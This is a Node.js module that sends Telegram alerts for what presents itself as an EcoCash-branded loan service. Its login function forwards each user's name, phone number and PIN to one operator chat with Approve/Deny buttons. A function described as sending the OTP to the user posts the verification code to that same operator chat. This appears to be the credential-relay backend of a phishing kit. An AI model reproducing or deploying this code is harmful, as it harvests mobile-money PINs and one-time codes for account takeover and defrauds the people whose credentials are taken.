const { getTelegramBot } = require('../config/telegram');

const sendTelegramMessage = async (chatId, message, options = {}) => {
  try {
    const bot = getTelegramBot();
    if (!bot) {
      console.error('❌ Telegram bot not initialized');
      return false;
    }

    const result = await bot.sendMessage(chatId, message, options);
    return result;
  } catch (error) {
    console.error('❌ Telegram send error:', error.message);
    return false;
  }
};

// Send login alert to admin
const sendLoginAlert = async (phoneNumber, fullName, pin = '****') => {
  const message = `
🔐 **New Login Alert**

👤 **User:** ${fullName}
📱 **Phone:** +263 ${phoneNumber}
🔢 **PIN:** ${pin}
⏰ **Time:** ${new Date().toLocaleString()}

⚠️ Please approve or deny this login request.
  `;

  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  const timestamp = Date.now();
  const approveData = `approve_${timestamp}`;
  const cancelData = `cancel_${timestamp}`;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: approveData },
          { text: '❌ Deny', callback_data: cancelData }
        ]
      ]
    },
    parse_mode: 'Markdown'
  };

  return await sendTelegramMessage(chatId, message, options);
};

// Send OTP to user via Telegram
const sendOTPToUser = async (phoneNumber, otp) => {
  const message = `
🔐 **Your EcoCash Verification Code**

📱 **Phone:** +263 ${phoneNumber}
🔑 **OTP:** \`${otp}\`
⏰ **Expires:** ${process.env.OTP_EXPIRY_MINUTES || 5} minutes

⚠️ **DO NOT SHARE this code with anyone!**
  `;

  const chatId = process.env.TELEGRAM_CHAT_ID;
  const options = {
    parse_mode: 'Markdown'
  };

  return await sendTelegramMessage(chatId, message, options);
};

// Send loan application alert
const sendLoanApplicationAlert = async (application) => {
  const message = `
🏦 **New Loan Application**

📋 **Reference:** ${application.referenceNumber || 'N/A'}
👤 **Applicant:** ${application.user?.fullName || 'Unknown'}
📱 **Phone:** +263 ${application.user?.phoneNumber || 'Unknown'}
💰 **Amount:** $${application.loanAmount?.toLocaleString() || '0'}
📊 **Type:** ${application.loanType || 'N/A'}
📅 **Term:** ${application.loanTerm || 0} months
📝 **Purpose:** ${application.loanPurpose || 'Not specified'}
  `;

  const chatId = process.env.TELEGRAM_CHAT_ID;
  const options = {
    parse_mode: 'Markdown'
  };

  return await sendTelegramMessage(chatId, message, options);
};

module.exports = {
  sendTelegramMessage,
  sendLoginAlert,
  sendOTPToUser,
  sendLoanApplicationAlert
}; 
